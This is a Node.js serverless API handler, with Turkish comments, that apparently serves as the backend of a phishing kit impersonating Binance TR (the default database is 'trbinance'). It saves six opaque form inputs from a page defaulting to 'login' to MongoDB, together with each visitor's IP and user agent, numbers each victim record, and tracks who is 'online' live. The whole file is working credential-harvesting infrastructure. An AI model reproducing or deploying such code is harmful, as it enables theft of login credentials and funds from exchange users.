const clientPromise = require('../lib/mongo');

async function readBody(req) {
  const chunks = [];
  return new Promise((resolve, reject) => {
    req.on('data', chunk => chunks.push(chunk));
    req.on('end', () => {
      try {
        const raw = Buffer.concat(chunks).toString() || '{}';
        resolve(JSON.parse(raw));
      } catch (err) {
        reject(err);
      }
    });
    req.on('error', reject);
  });
}

function getClientIp(req) {
  const header = req.headers['x-forwarded-for'] || req.headers['X-Forwarded-For'];
  if (header) {
    return header.split(',')[0].trim();
  }
  return (req.socket && req.socket.remoteAddress) || 'unknown';
}

module.exports = async (req, res) => {
  if (req.method !== 'POST') {
    return res.status(405).json({ error: 'Method not allowed' });
  }

  try {
    const body = await readBody(req);
    const {
      page = 'login',
      inputs = {}
    } = body || {};

    const ip = getClientIp(req);
    const userAgent = req.headers['user-agent'] || req.headers['User-Agent'] || 'unknown';
    const now = new Date();

    const setFields = {
      updatedAt: now,
      ip,
      userAgent: String(userAgent).slice(0, 500)
    };

    if (page && String(page).trim()) {
      setFields.page = String(page).slice(0, 120);
    }

    // Sadece gönderilen ve boş olmayan input alanlarını güncelle
    // Boş string gönderilirse veya hiç gönderilmezse MongoDB'deki değeri koru
    // Örnek: Eğer sadece input1 gönderildiyse, sadece input1'i güncelle, input2-6'yı koru
    if (inputs && typeof inputs === 'object') {
      for (let i = 1; i <= 6; i += 1) {
        const key = `input${i}`;
        // Sadece inputs objesinde key varsa kontrol et
        if (Object.prototype.hasOwnProperty.call(inputs, key)) {
          const value = inputs[key];
          // Sadece değer varsa, null değilse ve boş string değilse güncelle
          if (value !== undefined && value !== null && String(value).trim() !== '') {
            setFields[key] = String(value).trim().slice(0, 512);
          }
          // Eğer key yoksa veya boş string ise, MongoDB'deki değeri koru (güncelleme yapma)
        }
      }
    }

    // Retry mekanizması ile MongoDB işlemini yap - kayıt garanti edilene kadar dene
    let retryCount = 0;
    const maxRetries = 5;
    const retryDelay = 1000; // 1 saniye
    
    let success = false;
    let lastError;
    
    while (retryCount < maxRetries && !success) {
      try {
        const client = await clientPromise;
        
        // Bağlantı kontrolü - ping ile test et
        try {
          await client.db('admin').command({ ping: 1 });
        } catch (pingErr) {
          if (retryCount < maxRetries - 1) {
            console.log(`MongoDB connection check failed, retrying... (${retryCount + 1}/${maxRetries})`);
            await new Promise(resolve => setTimeout(resolve, retryDelay * (retryCount + 1)));
            retryCount++;
            continue;
          }
        }
        
        const db = client.db(process.env.MONGODB_DB || 'trbinance');
        const logs = db.collection('formLogs');
        const sessions = db.collection('sessions');

        // Mevcut kaydı kontrol et
        const existingLog = await logs.findOne({ ip });

        const setOnInsertFields = {
          createdAt: now
        };

        // Eğer page gönderilmediyse, sadece yeni kayıt oluşturulurken ekle
        if (!page) {
          setOnInsertFields.page = 'unknown';
        }

        // Yeni kayıt oluşturuluyorsa logNumber ekle
        if (!existingLog) {
          const totalLogs = await logs.countDocuments();
          setOnInsertFields.logNumber = totalLogs + 1;
        }

        const result = await logs.updateOne(
          { ip },
          {
            $set: setFields,
            $setOnInsert: setOnInsertFields
          },
          { upsert: true }
        );

        // MongoDB'ye kaydın başarıyla yapıldığından emin ol
        if (result.acknowledged !== true) {
          throw new Error('Database write not acknowledged');
        }

        // Response dönen kullanıcıyı sessions'a da ekle (online yap)
        await sessions.updateOne(
          { ip },
          {
            $set: {
              ip,
              lastSeen: now
            }
          },
          { upsert: true }
        ).catch(err => console.error('Session update failed', err));
        
        success = true;
      } catch (err) {
        lastError = err;
        retryCount++;
        
        const isConnectionError = 
          err.message?.includes('timeout') ||
          err.message?.includes('ECONNREFUSED') ||
          err.message?.includes('ENOTFOUND') ||
          err.message?.includes('MongoServerSelectionError') ||
          err.message?.includes('connection') ||
          err.message?.includes('not acknowledged');
        
        if (isConnectionError && retryCount < maxRetries) {
          console.log(`MongoDB operation failed, retrying... (${retryCount}/${maxRetries}): ${err.message}`);
          await new Promise(resolve => setTimeout(resolve, retryDelay * retryCount));
        } else {
          // Retry yapılamayacak hata veya max retry'a ulaşıldı
          break;
        }
      }
    }
    
    if (!success) {
      console.error(`MongoDB operation failed after ${retryCount} attempts:`, lastError?.message);
      return res.status(500).json({ error: 'Database write failed after retries' });
    }

    return res.status(201).json({ ok: true });
  } catch (err) {
    console.error('Form log error', err);
    return res.status(500).json({ error: 'Internal server error' });
  }
};


